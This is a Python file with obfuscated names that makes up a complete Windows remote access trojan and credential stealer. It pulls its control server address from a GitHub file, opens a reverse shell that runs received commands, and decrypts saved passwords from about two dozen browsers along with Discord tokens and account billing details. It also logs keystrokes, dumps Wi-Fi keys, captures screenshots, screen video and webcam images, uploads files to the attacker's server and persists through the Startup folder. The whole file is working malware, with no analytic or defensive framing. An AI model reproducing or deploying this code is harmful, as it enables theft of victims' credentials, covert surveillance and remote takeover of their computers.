import urllib.request,subprocess,socket,time,os,json,base64,shutil,re
from datetime import datetime
rOTVZDGMouBv = ""
zpSQaqbfXrgYquLAoDhMCTQ = ""
SMItbTctQFTXperAqPApdk = "28.04.25.0"
SgxgolSM = True
SvCVPEcyQxhYeYSehixu = "!"
YShLoElGbl = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
LCADLUIP = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
AqLFArjDTjjPtrU = os.path.expanduser("~\\AppData\\Local\\")
qRAzCepoEOAtayaeIRAS = os.path.expanduser("~\\AppData\\Roaming\\")
tfTcEAAJPLXQncEWmJSGRBf = ""
vUoiDKqfffNgXP = {
	'chrome':AqLFArjDTjjPtrU+'Google\\Chrome\\User Data','chromium':AqLFArjDTjjPtrU+'Chromium\\User Data','chrome-canary':AqLFArjDTjjPtrU+'Google\\Chrome SxS\\User Data',
	'msedge':AqLFArjDTjjPtrU+'Microsoft\\Edge\\User Data','msedge-canary':AqLFArjDTjjPtrU+'Microsoft\\Edge SxS\\User Data',
	'msedge-beta':AqLFArjDTjjPtrU+'Microsoft\\Edge Beta\\User Data','msedge-dev':AqLFArjDTjjPtrU+'Microsoft\\Edge Dev\\User Data',
	'avast':AqLFArjDTjjPtrU+'AVAST Software\\Browser\\User Data','amigo':AqLFArjDTjjPtrU+'Amigo\\User Data',
	'torch':AqLFArjDTjjPtrU+'Torch\\User Data','kometa':AqLFArjDTjjPtrU+'Kometa\\User Data','orbitum':AqLFArjDTjjPtrU+'Orbitum\\User Data',
	'cent-browser':AqLFArjDTjjPtrU+'CentBrowser\\User Data','7star':AqLFArjDTjjPtrU+'7Star\\7Star\\User Data',
	'sputnik':AqLFArjDTjjPtrU+'Sputnik\\Sputnik\\User Data','vivaldi':AqLFArjDTjjPtrU+'Vivaldi\\User Data',
	'epic-privacy-browser':AqLFArjDTjjPtrU+'Epic Privacy Browser\\User Data','uran':AqLFArjDTjjPtrU+'uCozMedia\\Uran\\User Data',
	'yandex':AqLFArjDTjjPtrU+'Yandex\\YandexBrowser\\User Data','brave':AqLFArjDTjjPtrU+'BraveSoftware\\Brave-Browser\\User Data',
	'iridium':AqLFArjDTjjPtrU+'Iridium\\User Data','coccoc':AqLFArjDTjjPtrU+'CocCoc\\Browser\\User Data',
	'opera':qRAzCepoEOAtayaeIRAS+'Opera Software\\Opera Stable','opera-gx':qRAzCepoEOAtayaeIRAS+'Opera Software\\Opera GX Stable'
}
def xpcDxEq(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def MJINJjPDavXObGOrZpULFMy(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	gQEjdVKmDonsWKeQeTTLSH = data.decode("utf-8").replace("\n","")
	if not gQEjdVKmDonsWKeQeTTLSH.startswith(SvCVPEcyQxhYeYSehixu):
		proc = subprocess.run(gQEjdVKmDonsWKeQeTTLSH, shell=True, capture_output=True)
		mbSJCXIU = proc.stdout + proc.stderr
		ztwDyLFLqTzJrNG(s, mbSJCXIU)
		return
	jLpTZKNOl = gQEjdVKmDonsWKeQeTTLSH.split(" ")[0][1:]
	args = " ".join(gQEjdVKmDonsWKeQeTTLSH.split()[1:]).split()
	if jLpTZKNOl == "download":
		ZXjLThei(s, gQEjdVKmDonsWKeQeTTLSH)
	elif jLpTZKNOl == "screenshot":
		zSVAWJIAPmSaylgen(s)
	elif jLpTZKNOl == "basename":
		ztwDyLFLqTzJrNG(s, os.path.basename(__file__))
	elif jLpTZKNOl == "update":
		ITBOhmjGJx(s)
	elif jLpTZKNOl == "wifi":
		EFcsnXqoOIRXjyAAKquUwcF(s)
	elif jLpTZKNOl == "screenrecord":
		mEwpUqloZVvFg(s, args)
	elif jLpTZKNOl == "browsers":
		vKpAEgOGaqXMEzODLjMNWe(s)
	elif jLpTZKNOl == "webcam":
		webCam(s, args)
	elif jLpTZKNOl == "cd":
		moveDirectory(s, gQEjdVKmDonsWKeQeTTLSH[4:])
	else:
		ztwDyLFLqTzJrNG(s,"")
def moveDirectory(s, path):
	try:
		os.chdir(path)
		ztwDyLFLqTzJrNG(s,"")
	except:
		ztwDyLFLqTzJrNG(s, "[!] 404")
def ZXjLThei(s, gQEjdVKmDonsWKeQeTTLSH):
	XwBHeNIXgFwCrB = gQEjdVKmDonsWKeQeTTLSH.replace(SvCVPEcyQxhYeYSehixu+"download ","").split(",")
	mbSJCXIUs = ""
	for f in XwBHeNIXgFwCrB:
		mbSJCXIUs += FKhSEpgVSw(f, "api/file/", { "type":os.path.splitext(f)[1] })
	ztwDyLFLqTzJrNG(s, mbSJCXIUs)
def zSVAWJIAPmSaylgen(s):
	from PIL import ImageGrab
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	vUeFtkWiNuWm = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(vUeFtkWiNuWm)
	image.close()
	mbSJCXIU = FKhSEpgVSw(vUeFtkWiNuWm, "api/sscap")
	os.remove(vUeFtkWiNuWm)
	ztwDyLFLqTzJrNG(s, mbSJCXIU)
def webCam(s, args):
	import cv2
	cameraNumber = 0
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		cam = cv2.VideoCapture(cameraNumber)
		_, frame = cam.read()
		cv2.imwrite(AqLFArjDTjjPtrU+"wc.jpg", frame)
		cam.release()
		r=FKhSEpgVSw(AqLFArjDTjjPtrU+"wc.jpg","api/wc")
		ztwDyLFLqTzJrNG(s, r)
	except Exception as e:
		ztwDyLFLqTzJrNG(s, "[!] 404: "+str(e))
def mEwpUqloZVvFg(s, args):
	import imageio
	from PIL import ImageGrab
	LNHgEsEtnlDPUVitr = 15
	if not args == []:
		try: LNHgEsEtnlDPUVitr = int(args[0])
		except: pass
	NNDGrlpKptQAosZeMXqRM = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	YFGLadSRrgjaRsFXNNzppd = []
	fps = 11
	numFrames = LNHgEsEtnlDPUVitr * fps
	for _ in range(numFrames):
		YFGLadSRrgjaRsFXNNzppd.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(NNDGrlpKptQAosZeMXqRM, YFGLadSRrgjaRsFXNNzppd, fps=fps, quality=8)
	r=FKhSEpgVSw(NNDGrlpKptQAosZeMXqRM, "api/screc")
	os.remove(NNDGrlpKptQAosZeMXqRM)
	ztwDyLFLqTzJrNG(s, r)
def FKhSEpgVSw(mUqlxppCIJJuvXrBMxbMd, deXhSNqrcocxDDmJmqh, KrPtGCxdXsPXj=None):
	import requests
	if not os.path.isfile(mUqlxppCIJJuvXrBMxbMd):
		return "[!] 404: "+mUqlxppCIJJuvXrBMxbMd+"\n"
	headers = {"user":os.getlogin()}
	if KrPtGCxdXsPXj is not None:
		headers = {**headers, **KrPtGCxdXsPXj}
	f = open(mUqlxppCIJJuvXrBMxbMd, "rb")
	requests.post("http://"+rOTVZDGMouBv+":5555/"+deXhSNqrcocxDDmJmqh,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def irhDjAebXuoDauitqjkgwa(uBnBGtgfPnrHygiwMCSiBj, deXhSNqrcocxDDmJmqh):
	import requests
	if uBnBGtgfPnrHygiwMCSiBj.strip() == "":
		return "[!] 204"
	requests.post("http://"+rOTVZDGMouBv+":5555/"+deXhSNqrcocxDDmJmqh,
		data=uBnBGtgfPnrHygiwMCSiBj,
		headers={"user":os.getlogin()})
	return "[+] 200"
def ITBOhmjGJx(s):
	h, p, v = dNJsnSNf(True)
	if (v != SMItbTctQFTXperAqPApdk):
		vbeDzWG(v)
		ztwDyLFLqTzJrNG(s, "[+] 200")
	else:
		ztwDyLFLqTzJrNG(s, "[-] 304")
def EFcsnXqoOIRXjyAAKquUwcF(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		ztwDyLFLqTzJrNG(s, "[!] 500")
		return
	cmNToQaimBEOpZDWHZRj = ""
	for p in profiles:
		try: cmNToQaimBEOpZDWHZRj+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: cmNToQaimBEOpZDWHZRj+=f"    {p} - N/A"
	ztwDyLFLqTzJrNG(s, cmNToQaimBEOpZDWHZRj)
def vbeDzWG(BrhDkKARNAndmJRlvOHuCv):
	import requests
	global SgxgolSM
	UDigkyYZBbqvlN = os.path.basename(__file__)
	fileType = UDigkyYZBbqvlN.split(".")[-1]
	GxqDvSTISGg = UDigkyYZBbqvlN.split(".")[0]+"."+BrhDkKARNAndmJRlvOHuCv+".pyw" if fileType.startswith("py") else ".exe"
	utdDoPuCPhCKwNRmtMG = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), GxqDvSTISGg)
	if not os.path.isfile(utdDoPuCPhCKwNRmtMG):
		with open(utdDoPuCPhCKwNRmtMG, "w+") as f:
			f.write(requests.get(LCADLUIP+"file."+ "pyw" if utdDoPuCPhCKwNRmtMG.split(".")[-1].startswith("py") else "exe").text)
	else:
		SgxgolSM = False
def dNJsnSNf(force=False):
	global rOTVZDGMouBv, zpSQaqbfXrgYquLAoDhMCTQ
	if force or rOTVZDGMouBv == "" or zpSQaqbfXrgYquLAoDhMCTQ == "":
		while True:
			try:
				with urllib.request.urlopen(YShLoElGbl) as response:
					data = response.read().decode("utf-8").replace("\n","").split(":")
					rOTVZDGMouBv = data[0].strip()
					zpSQaqbfXrgYquLAoDhMCTQ = data[1].strip()
					BrhDkKARNAndmJRlvOHuCv = data[2].strip()
					return rOTVZDGMouBv, zpSQaqbfXrgYquLAoDhMCTQ, BrhDkKARNAndmJRlvOHuCv
			except:
				time.sleep(10)
def mrrliztzTvTzKPtkUqhc():
	try:
		ytCAPDMD = "settings.xpb"
		VTDarjzAZWh = sorted([file for file in os.listdir(AqLFArjDTjjPtrU) if os.path.isfile(AqLFArjDTjjPtrU+"\\"+file) and file.endswith(ytCAPDMD.split(".")[-1])])
		if ytCAPDMD in VTDarjzAZWh:
			VTDarjzAZWh.remove(ytCAPDMD)
		wkKWoRzg = os.path.join(AqLFArjDTjjPtrU,ytCAPDMD)
		if len(VTDarjzAZWh) > 0:
			with open(wkKWoRzg, "ab+") as f:
				for file in VTDarjzAZWh:
					temp = os.path.join(AqLFArjDTjjPtrU,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		FKhSEpgVSw(wkKWoRzg, "api/log")
		if os.path.isfile(wkKWoRzg):
			os.remove(wkKWoRzg)
	except:
		pass
def yiAUjmKVjFdMgqXxDVH():
	from pynput.keyboard import Listener
	import logging
	logging.basicConfig(filename=(AqLFArjDTjjPtrU+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def jwkyHxUTdlQalIOyFkm(k):
		logging.info(str(k))
	k=Listener(on_press=jwkyHxUTdlQalIOyFkm)
	tyYnJFMjRvwRGM = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in tyYnJFMjRvwRGM:
		l.setLevel(logging.CRITICAL)
	k.start()
def vKpAEgOGaqXMEzODLjMNWe(s, upload=False):
        import requests,sqlite3,win32crypt
        from Cryptodome.Cipher import AES
        mUlLgqUHdak = "\n"
        for browser in vUoiDKqfffNgXP:
                path = vUoiDKqfffNgXP[browser]
                fPIChZk = None
                if not os.path.isfile(path+"\\Local State"):
                        continue
                with open(path+"\\Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        fPIChZk = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                profiles = [p for p in os.listdir(path) if p == "Default" or p.startswith("Profile ")]
                if browser == "opera" or browser == "opera-gx": profiles=[""]
                for profile in profiles:
                        try:shutil.copyfile(f"{path}\\{profile}\\Login Data", AqLFArjDTjjPtrU+"\\db.db")
                        except:continue
                        conn = sqlite3.connect(AqLFArjDTjjPtrU+"\\db.db")
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        mUlLgqUHdak += str("*"*8+f" {browser} - {profile} "+"*"*8+"\n")
                        for _, data in enumerate(cursor.fetchall()):
                                ciphertext = data[2]
                                initVector = ciphertext[3:15]
                                encryptedPwd = ciphertext[15:-16]
                                cipher = AES.new(fPIChZk, AES.MODE_GCM, initVector)
                                decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
                                mUlLgqUHdak += f"URL: {data[0]}\nUser: {data[1]}\nValue: {decryptedPwd}\n\n"
                        cursor.close()
                        conn.close()
                        os.remove(AqLFArjDTjjPtrU+"\\db.db")
        MKJgrLsXCvBsJsu = []
        discordPaths = [qRAzCepoEOAtayaeIRAS+'\\discord\\Local Storage\\leveldb\\',qRAzCepoEOAtayaeIRAS+'\\discordcanary\\Local Storage\\leveldb\\',qRAzCepoEOAtayaeIRAS+'\\discordptb\\Local Storage\\leveldb\\']
        for p in [dp for dp in discordPaths if os.path.exists(dp)]:
                fPIChZk = ""
                with open(p.replace("Local Storage\\leveldb\\","")+"Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        fPIChZk = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                for file in [f for f in os.listdir(p) if f.endswith(".log") or f.endswith(".ldb")]:
                        for line in [x.strip() for x in open(f"{p}\\{file}","r", errors="ignore").readlines() if x.strip()]:
                                for value in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                        value = base64.b64decode(value.split('dQw4w9WgXcQ:')[1])
                                        tinitVector = value[3:15]
                                        encryptedToken = value[15:]
                                        tcipher = AES.new(fPIChZk, AES.MODE_GCM, tinitVector)
                                        decryptedToken = (tcipher.decrypt(encryptedToken))[:-16].decode()
                                        if decryptedToken not in MKJgrLsXCvBsJsu:
                                                MKJgrLsXCvBsJsu.append(decryptedToken)
        SibbefaRFtzVD = "https://discord.com/api/v9/users/@me"
        if MKJgrLsXCvBsJsu: mUlLgqUHdak +="*"*8+"Discord Data: "+"*"*8+"\n\n"
        for UwKPPFSyVlXmcS in MKJgrLsXCvBsJsu:
                headers = {"Content-Type":"application/json","Authorization":UwKPPFSyVlXmcS,
                           "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
                j = requests.get(SibbefaRFtzVD, headers=headers).json()
                if j.get("message") != None: continue
                user = str(j.get('username')) + '#' + str(j.get("discriminator"))
                badges = ""
                flags = j['flags']
                if (flags == 1): badges += "Staff, "
                if (flags == 2): badges += "Partner, "
                if (flags == 4): badges += "Hypesquad Event, "
                if (flags == 8): badges += "Green Bughunter, "
                if (flags == 64): badges += "Hypesquad Bravery, "
                if (flags == 128): badges += "HypeSquad Brillance, "
                if (flags == 256): badges += "HypeSquad Balance, "
                if (flags == 512): badges += "Early Supporter, "
                if (flags == 16384): badges += "Gold BugHunter, "
                if (flags == 131072): badges += "Verified Bot Developer, "
                if (badges == ""): badges = "None"
                email = j.get("email")
                phone = j.get("phone") if j.get("phone") else "N/A"
                try:
                        nitro_data = requests.get(SibbefaRFtzVD+'/billing/subscriptions', headers=headers).json()
                        has_nitro = bool(len(nitro_data) > 0)
                except: pass
                try: billing = bool(len(json.loads(requests.get(SibbefaRFtzVD+"/billing/payment-sources", headers=headers).text)) > 0)
                except: pass
                mUlLgqUHdak += f"\n{user}\n{'-'*len(user)}\nToken: {UwKPPFSyVlXmcS}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n"
        mUlLgqUHdak += "\n\n"
        if not upload:
                ztwDyLFLqTzJrNG(s, mUlLgqUHdak)
        else:
                irhDjAebXuoDauitqjkgwa(mUlLgqUHdak, "api/google")
def ztwDyLFLqTzJrNG(clientSocket, uBnBGtgfPnrHygiwMCSiBj):
	formattedData = b""
	if type(uBnBGtgfPnrHygiwMCSiBj) == bytes:
		formattedData += uBnBGtgfPnrHygiwMCSiBj
	else:
		formattedData += bytes(uBnBGtgfPnrHygiwMCSiBj, "utf-8")
	formattedData += bytes("\n"+tfTcEAAJPLXQncEWmJSGRBf+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def lcPXCWwUS():
	global tfTcEAAJPLXQncEWmJSGRBf
	h, p, v = dNJsnSNf()
	try: mrrliztzTvTzKPtkUqhc()
	except: pass
	try:
		if SMItbTctQFTXperAqPApdk != v:
			vbeDzWG(v)
	except: pass
	try:
		if SgxgolSM:
			vKpAEgOGaqXMEzODLjMNWe(None,True)
	except: pass
	try:
		if SgxgolSM:
			yiAUjmKVjFdMgqXxDVH()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	tfTcEAAJPLXQncEWmJSGRBf = ("(old)"if SMItbTctQFTXperAqPApdk!=v else "")+"["+SMItbTctQFTXperAqPApdk+"] "+os.getlogin()+" - "
	while True:
		ejEgGQZUVLWshQi=False
		try:
			s=xpcDxEq(h, p)
			ztwDyLFLqTzJrNG(s, "")
			while not ejEgGQZUVLWshQi:
				try: ejEgGQZUVLWshQi=MJINJjPDavXObGOrZpULFMy(s)
				except Exception as e:
					ztwDyLFLqTzJrNG(s, str(e))
			s.close()
		except:
			pass
		time.sleep(5)
lcPXCWwUS()
